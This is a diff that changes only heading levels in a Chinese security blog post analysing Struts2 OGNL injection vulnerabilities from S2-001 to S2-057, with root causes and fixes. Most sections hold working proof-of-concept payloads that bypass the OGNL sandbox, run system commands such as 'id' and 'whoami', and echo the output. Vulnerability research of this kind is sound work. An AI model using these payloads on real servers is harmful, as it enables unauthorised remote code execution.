@@ -6,7 +6,7 @@ categories: notes
 date: 2020-05-22 17:14:38
 typora-root-url: ../../../source
 ---
-# 0x00 前言
+## 0x00 前言
 
 ---
 
@@ -14,7 +14,7 @@ typora-root-url: ../../../source
 
 <!-- more -->
 
-# 0x01 基础
+## 0x01 基础
 
 ---
 
@@ -44,11 +44,11 @@ Ognl.setValue("(\"@java.lang.Runtime@getRuntime().exec(\'open /System/Applicatio
 
 关于`setValue`函数的另一种利用方法S2-009的方式`a[(1)(2)]`，其中`(1)(2)`后续会单独拿出来被当作OGNL表达式执行。
 
-# 0x02 历史版本回顾
+## 0x02 历史版本回顾
 
 ---
 
-## 1. [S2-001](https://cwiki.apache.org/confluence/display/WW/S2-001)
+### 1. [S2-001](https://cwiki.apache.org/confluence/display/WW/S2-001)
 
 参考：https://xz.aliyun.com/t/2044
 
@@ -58,7 +58,7 @@ source: 使用了`s:textfield`标签用于表单生成，当用户输入不合�
 
 sink: jsp渲染调用`doEndTag `，后续由于识别出用户输入中OGNL表达式而调用`Ognl.getValue`
 
-### 漏洞分析
+#### 漏洞分析
 
 主要出问题的是JSP中`<s:textfield>`标签，Struts2里处理textfield的是`org.apache.struts2.components.UIBean`
 
@@ -88,7 +88,7 @@ sink: jsp渲染调用`doEndTag `，后续由于识别出用户输入中OGNL表�
 
 第二遍会去解析` %{@java.lang.Runtime....}`，这里执行了我们想要执行的命令。
 
-### 回显POC
+#### 回显POC
 
 前面简单用了OGNL表达式调用静态方法的形式来执行系统命令` @java.lang.Runtime@getRuntime().exec(command)`
 
@@ -132,7 +132,7 @@ sink: jsp渲染调用`doEndTag `，后续由于识别出用户输入中OGNL表�
 %{#pb=(new java.lang.ProcessBuilder("whoami")).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(), #writer.println(#str),#writer.flush(),#writer.close()}
 ```
 
-### 修复
+#### 修复
 
 在>=2.0.9版本的struts2上，`com.opensymphony.xwork2.util.TextParseUtil#translateVariables`做了循环判断，不允许递归执行OGNL表达式
 
@@ -140,7 +140,7 @@ sink: jsp渲染调用`doEndTag `，后续由于识别出用户输入中OGNL表�
 
 默认`maxLoopCount`为1，所以处理完`%{name}`后，不会再继续对他的值进行OGNL表达式的执行了。
 
-## 2. [S2-003](https://cwiki.apache.org/confluence/display/WW/S2-003)
+### 2. [S2-003](https://cwiki.apache.org/confluence/display/WW/S2-003)
 
 影响范围：2.0.0 - 2.0.11.2
 
@@ -150,7 +150,7 @@ source: 参数的key，使用unicode编码绕过`#`的检测
 
 sink: 调用`Ognl.setValue`
 
-### 漏洞分析
+#### 漏洞分析
 
 Struts2在处理参数内容时，将调用`com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters`函数，填充到OgnlVauleStack的context上下文里。
 
@@ -180,7 +180,7 @@ Struts2在处理参数内容时，将调用`com.opensymphony.xwork2.interceptor.
 
 这里最终到了`OgnlUtil.setValue`计算OGNL表达式
 
-### POC分析
+#### POC分析
 
 来看一个调用命令执行的POC
 
@@ -214,7 +214,7 @@ Struts2在处理参数内容时，将调用`com.opensymphony.xwork2.interceptor.
 
 这里poc的先后顺序用到了第一个位置，实际的ognl表达式放到了第二个位置`(1)((2)(3))`
 
-### 修复
+#### 修复
 
 xwork>=2.0.6 `com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters`多了以下代码
 
@@ -248,13 +248,13 @@ xwork>=2.0.6 `com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParam
 
 所以如果要绕过这个版本的限制，首先需要解决的是这个函数的报错问题，看S2-005
 
-## 3. [S2-005](https://cwiki.apache.org/confluence/display/WW/S2-005)
+### 3. [S2-005](https://cwiki.apache.org/confluence/display/WW/S2-005)
 
 影响版本：struts2.0.0 - 2.1.8.1
 
 S2-005为S2-003的修复绕过，直接分析POC
 
-### POC分析
+#### POC分析
 
 ```java
 ('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&
@@ -295,11 +295,11 @@ poc里的第一行做的就是这个事情，将`excludeProperties`置为空集�
 
 这里使用了`@org.apache.struts2.ServletActionContext@getResponse()`静态方法来获取response
 
-### 修复
+#### 修复
 
 xwork>=2.2.1.1，对参数名做了更为细致的正则检查`[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+`
 
-## 4. S2-007
+### 4. S2-007
 
 这里跟S2-008里面的第一个漏洞一样
 
@@ -323,7 +323,7 @@ value为我们传入的数据，过了一次getOverrideExpr
 
 在`tryFIndValue`函数中，从stack的overrides中取出前面加了单引号的数据，并在后续调用`Ognl.getValue`，导致了Ognl表达式的执行。
 
-### POC
+#### POC
 
 ```java
 '+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +'
@@ -355,13 +355,13 @@ xwork>=2.2.3，ognl表达式计算时，调用函数的函数判断`isAcceptable
 ) +'
 ```
 
-## 5. S2-008
+### 5. S2-008
 
 S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display/WW/S2-008
 
 其中1跟S2-007类似，3不看了，主要关注2和4
 
-### CookieInterceptor
+#### CookieInterceptor
 
 这里的原理同S2-005类似，这里看代码比较直观，没有搭环境调了
 
@@ -373,13 +373,13 @@ S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display
 
 这里会到`OgnlValueStack.setValue`，也就是后续调用`Ognl.setValue`，用`((1)(2))(3)`的方式来执行任意OGNL表达式
 
-### DebuggingInterceptor
+#### DebuggingInterceptor
 
 ![image-20200509204915751](/images/talk_about_struts2/image-20200509204915751.png)
 
 当开启开发者模式时，传入`debug=command&expression=xxxx`，即可执行OGNL表达式
 
-### POC
+#### POC
 
 ```java
 ?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))
@@ -387,7 +387,7 @@ S2-008一共有4个漏洞，详细看https://cwiki.apache.org/confluence/display
 (%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res))
 ```
 
-## 6. [S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)
+### 6. [S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)
 
 影响范围：2.0.0 - 2.3.1.1
 
@@ -423,7 +423,7 @@ Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代
 
 这里巧妙的就是利用这种中转的方式，规避了参数名的正则检测
 
-### POC
+#### POC
 
 ```java
 ?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&z[(password)(bla)]=1
@@ -431,7 +431,7 @@ Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代
 ?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&z[(password)(bla)]=1
 ```
 
-### 修复
+#### 修复
 
 改进了正则
 
@@ -445,7 +445,7 @@ Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代
 
 
 
-## 7. S2-012
+### 7. S2-012
 
 影响范围：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2
 
@@ -496,7 +496,7 @@ Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代
 
 所以对于S2-012来说，配置中`${currentSkill.name}`是至关重要的
 
-### 修复
+#### 修复
 
 由于我前面分析的是`2.2.3`版本，后续的版本的`translateVariables`变化有点大，其修复版本
 
@@ -504,7 +504,7 @@ Ognl.setValue("a[(test)(bla)]",context,"");// 以a[(test)(bla)],执行test所代
 
 增加了pos来做起始位置来查找`${}%{}`，在第一次表达式执行完成后会更新pos值，来防止二次OGNL表达式执行
 
-### POC
+#### POC
 
 ```
 currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}
@@ -512,7 +512,7 @@ currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xw
 %{(#_memberAccess['allowStaticMethodAccess']=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())}
 ```
 
-## 8. S2-013/S2-014
+### 8. S2-013/S2-014
 
 影响范围：Struts 2.0.0 - Struts 2.3.14.1
 
@@ -532,7 +532,7 @@ currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xw
 
 也同样是使用String转换时出现的OGNL表达式执行
 
-### POC
+#### POC
 
 ```java
 ?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))}
@@ -540,7 +540,7 @@ currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xw
 ?fakeParam=%{(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())}
 ```
 
-### 修复
+#### 修复
 
 ![image-20200514152500049](/images/talk_about_struts2/image-20200514152500049.png)
 
@@ -548,7 +548,7 @@ currentSkill.name=%{(#_memberAccess['allowStaticMethodAccess']=true,#context['xw
 
 这里`org.apache.struts2.views.util.DefaultUrlHelper`不再使用TextParseUtil来处理
 
-## 9. S2-015
+### 9. S2-015
 
 影响范围：Struts 2.0.0 - Struts 2.3.14.2
 
@@ -570,7 +570,7 @@ S2-015一共有两种：
 
 跟S2-012一样，解析执行`${另一层以%起始的OGNL表达式}`
 
-### POC
+#### POC
 
 ```
 // 摘自https://www.freebuf.com/vuls/217482.html
@@ -609,11 +609,11 @@ S2-015一共有两种：
 
 除了上面通过反射机制来进行绕过，我们也可以直接用构造器的方法来执行，比如`new ProccessBuilder('id').start()`
 
-### 修复
+#### 修复
 
 这里的修复就是S2-012的修复，主要修复了执行这种OGNL表达式`${另一层%起始的OGNL表达式}`
 
-## 10. S2-016
+### 10. S2-016
 
 范围：Struts 2.0.0 - Struts 2.3.15
 
@@ -621,13 +621,13 @@ S2-016问题出在处理默认的`action:xxx`或`redirect:xxx`，后面跟的`xx
 
 执行链路跟S2-012一样，不作分析了
 
-### POC
+#### POC
 
 ```java
 redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()}
 ```
 
-### 修复
+#### 修复
 
 `org.apache.struts2.dispatcher.mapper.DefaultActionMapper`默认的`redirect/redirectaction`直接被删除了
 
@@ -639,7 +639,7 @@ redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_membe
 
 已经不构成威胁了
 
-## 11. S2-019
+### 11. S2-019
 
 范围：Struts 2.0.0 - Struts 2.3.15.1
 
@@ -647,13 +647,13 @@ S2-019跟S2-008的第二个漏洞一样，当开启开发者模式时，允许�
 
 具体看S2-008
 
-### POC
+#### POC
 
 ```
 ?debug=command&expression=(%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23m=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close())
 ```
 
-### 修复
+#### 修复
 
 这里后面的几个版本都是允许执行的，开发者模式下的command并没有被取消掉，所以如果在线上环境碰到debug模式，那就可以尝试一下OGNL表达式的执行
 
@@ -667,7 +667,7 @@ debug=command&expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCES
 
 后续还有一些绕过，后面再讲
 
-## 12. S2-029/S2-036
+### 12. S2-029/S2-036
 
 S2-029影响范围：Struts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3)
 
@@ -691,7 +691,7 @@ S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要�
 
 此时再传入到`findValue`就是第二层的OGNL表达式，后续跟S2-001一样，只需要执行一次OGNL表达式计算即可
 
-### POC
+#### POC
 
 ```java
 // 需要先初始化SecurityMemberAccess，不然无法执行
@@ -722,7 +722,7 @@ S2-036影响范围：Struts 2.0.0 - Struts 2.3.28.1 （跟S2-029一样，主要�
 
 看前面的分析，知道可以将S2-029的修复bypass掉，也就是S2-036的问题
 
-## 13. S2-032/S2-033/S2-037
+### 13. S2-032/S2-033/S2-037
 
 影响范围：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
 
@@ -746,7 +746,7 @@ rest-plugin支持解析`xxx!method`的调用
 
 需要注意的是，在前面调用的interceptor里不能出现异常的情况，会导致无法执行到OGNL表达式执行的位置。这也就是为什么不能在开启`devMode`的情况下进行利用的原因。
 
-### POC
+#### POC
 
 ```java
 http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig
@@ -759,7 +759,7 @@ http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlCont
 
 还有一个需要注意的地方是，在最后调用`ognlUtil.getValue`时，在methodName后面拼接了`()`，我们需要将这个`()`做处理，比如这里的POC做的处理是`#xx.toString`去吃掉这个`()`
 
-### S2-032/S2-033修复
+#### S2-032/S2-033修复
 
 ![image-20200520230704180](/images/talk_about_struts2/image-20200520230704180.png)
 
@@ -775,7 +775,7 @@ http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlCont
 (#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json
 ```
 
-### S2-037修复
+#### S2-037修复
 
 ![image-20200520233839824](/images/talk_about_struts2/image-20200520233839824.png)
 
@@ -791,7 +791,7 @@ http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlCont
 
 使得我们不能在用`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`来绕过限制
 
-### 一个有意思的地方
+#### 一个有意思的地方
 
 前面说到这3个漏洞需要开启DynamicMethodInvocation，其实不开启也是可以的
 
@@ -857,7 +857,7 @@ S2-046原理一样，这里只分析S2-045
 
 需要一种新的思路来绕过，S2-045的POC就给我们提供这样一个思路
 
-### POC
+#### POC
 
 ```java
 %{
@@ -904,17 +904,17 @@ S2-046原理一样，这里只分析S2-045
 
 后续的代码就是执行并回显了，跟前面的类似
 
-### 修复
+#### 修复
 
 ![image-20200521204140738](/images/talk_about_struts2/image-20200521204140738.png)
 
 修复主要是不把message传入，放到了args的位置
 
-## 15. S2-048
+### 15. S2-048
 
 这一部分不仔细说了，看https://www.freebuf.com/vuls/217482.html
 
-## 16. S2-052
+### 16. S2-052
 
 影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
 
@@ -938,11 +938,11 @@ struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-typ
 
 所以我们传入构造好的XML就可以达到命令执行
 
-### POC
+#### POC
 
 这里的xml可以用我的ysomap去生成，把Content-Type设置成`application/xml`就可以了
 
-### 修复
+#### 修复
 
 S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单
 
@@ -958,7 +958,7 @@ S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系�
 
 这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化
 
-## 17. S2-053
+### 17. S2-053
 
 影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1
 
@@ -980,7 +980,7 @@ S2-053问题出在freemarker的标签内容可控时出现的问题
 
 回到了由`ServletUrlRenderer`来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由`TextParseUtil.translateVariables`触发的
 
-### POC
+#### POC
 
 poc可以直接用S2-045的poc
 
@@ -989,7 +989,7 @@ poc可以直接用S2-045的poc
 // 记得编码
 ```
 
-### 修复
+#### 修复
 
 > 这次的修复是在FreemarkerManager中多了两行代码，
 >
@@ -1008,7 +1008,7 @@ poc可以直接用S2-045的poc
 
 修复直接参考https://www.freebuf.com/vuls/217482.html
 
-## 18. S2-055
+### 18. S2-055
 
 影响范围：Struts 2.5 - Struts 2.5.14
 
@@ -1025,7 +1025,7 @@ S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏
 
 具体分析见[http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/](http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/)
 
-## 19. S2-057
+### 19. S2-057
 
 影响范围：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16
 
@@ -1057,7 +1057,7 @@ S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏
 
 传入了`TextParseUtil.translateVariables`，到这里就结束了，后续将调用OGNL.getValue
 
-### POC
+#### POC
 
 在2.3.x版本，可以直接用S2-045的poc打
 
@@ -1109,7 +1109,7 @@ ${
 
 
 
-# 0x03 总结
+## 0x03 总结
 
 ---
 
